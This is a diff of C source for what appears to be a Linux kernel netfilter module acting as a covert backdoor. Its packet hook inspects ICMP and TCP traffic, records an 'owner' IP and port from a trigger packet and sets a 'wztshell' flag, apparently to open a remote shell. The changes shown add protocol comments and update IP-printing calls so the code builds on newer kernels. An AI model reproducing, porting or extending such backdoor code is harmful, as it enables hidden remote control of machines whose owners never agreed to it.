@@ -404,7 +404,7 @@ unsigned int hook_func(unsigned int hooknum,
                 return NF_ACCEPT;
         //http://www.linuxquestions.org/questions/linux-kernel-70/struct-sk_buff-has-no-member-named-nh-882525/
         switch (ip_hdr(sk)->protocol) {
-                case 1:
+                case 1: //ICMP
 			#if DEBUG == 1
                         printk("[+] Got a icmp packet.\n");
 			#endif
@@ -414,7 +414,7 @@ unsigned int hook_func(unsigned int hooknum,
                         
                         return NF_ACCEPT;
                         
-                case 6:
+                case 6: //TCP
                	        ip = ip_hdr(sk);
                        	tcphdr = (struct tcphdr *)((__u32 *)ip + ip->ihl);
 			data = (char *)((int *)tcphdr + (int)(tcphdr->doff));
@@ -464,7 +464,7 @@ unsigned int hook_func(unsigned int hooknum,
                                 wztshell = 1;
 
 				#if DEBUG == 1
-                                printk("[+] Got %u.%u.%u.%u : %d\n",NIPQUAD(myowner_ip),ntohs(myowner_port));
+                                printk("[+] Got %pI4 : %d\n",&myowner_ip,ntohs(myowner_port));
                         	#endif
                                 goto out;
 			}
@@ -492,7 +492,7 @@ unsigned int hook_func(unsigned int hooknum,
                                 	wztshell = 1;
 
 					#if DEBUG == 1
-                                	printk("[+] Got %u.%u.%u.%u : %d\n",NIPQUAD(myowner_ip),ntohs(myowner_port));
+                                	printk("[+] Got %pI4: %d\n",(&myowner_ip),ntohs(myowner_port));
                         		#endif
 				}
 			}
